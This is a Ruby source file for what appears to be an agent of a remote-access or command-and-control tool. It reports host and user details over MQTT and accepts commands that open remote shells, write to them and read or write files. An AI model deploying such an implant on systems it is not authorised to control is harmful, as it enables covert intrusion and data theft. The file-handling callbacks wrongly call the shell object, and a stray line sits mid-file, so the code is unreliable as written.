require_relative "inators/remote_shell"
require_relative "inators/file_rw"
require 'paho-mqtt'
require 'json'
require 'securerandom'

agent = {
	id: SecureRandom.uuid,
	host: `uname -a`,
	user: `whoami`,
	inators: [
		:remote_shell,
		:file_rw
	]
}

client = PahoMqtt::Client.new
rs_inator = RemoteShellInator.new
frw_inator = FileReadWriteInator.new

client.on_connack do
	client.publish("/bu/agents/#{agent[:id]}", agent.to_json, false, 1)
end
5
client.add_topic_callback("/bu/agents/#{agent[:id]}/inators/remote_shell/cmds/open") do |packet|
	packet = JSON.parse(packet.payload, object_class: OpenStruct)
	rs_inator.open(packet.shell)
end

client.add_topic_callback("/bu/agents/#{agent[:id]}/inators/remote_shell/cmds/close") do |packet|
	packet = JSON.parse(packet.payload, object_class: OpenStruct)
	rs_inator.close(packet.pid)
end

client.add_topic_callback("/bu/agents/#{agent[:id]}/inators/remote_shell/cmds/write") do |packet|
	packet = JSON.parse(packet.payload, object_class: OpenStruct)
	rs_inator.write(packet.pid, packet.data)
end

client.add_topic_callback("/bu/agents/#{agent[:id]}/inators/file_rw/cmds/read") do |packet|
	packet = JSON.parse(packet.payload, object_class: OpenStruct)
	rs_inator.write(packet.file, packet.length, packet.offset)
end

client.add_topic_callback("/bu/agents/#{agent[:id]}/inators/file_rw/cmds/write") do |packet|
	packet = JSON.parse(packet.payload, object_class: OpenStruct)
	rs_inator.write(packet.file, packet.data, packet.offset)
end

client.on_message do |p|
	puts "Topic: #{p.topic}\nPayload: #{p.payload}\nQoS: #{p.qos}"
end

rs_inator.on :open do |pid, shell|
	puts "rs_inator@on_open pid => #{pid} shell => #{shell}"
end

rs_inator.on :close do |pid|
	puts "rs_inator@on_close pid => #{pid}"
end

rs_inator.on :read do |pid, data|
	puts "rs_inator@on_read pid => #{pid} data => #{data}"
end

rs_inator.on :write do |pid, data|
	puts "rs_inator@on_write pid => #{pid} data => #{data}"
end

rs_inator.on :error do |pid, error|
	puts "rs_inator@on_error pid => #{pid} error => #{error}"
end

frw_inator.on :read do |file, length, offset, data|
	puts "frw_inator@on_read file => #{file} length => #{length} offset => #{offset} data => #{data}"
end

frw_inator.on :write do |file, length, offset, data|
	puts "frw_inator@on_write file => #{file} length => #{length} offset => #{offset} data => #{data}"
end

frw_inator.on :error do |file, error|
	puts "frw_inator@on_error file => #{file} error => #{error}"
end

client.connect('localhost', 1883, client.keep_alive, true, true)
client.subscribe(["#", 2])

loop do
  client.loop_write
  client.loop_read
end
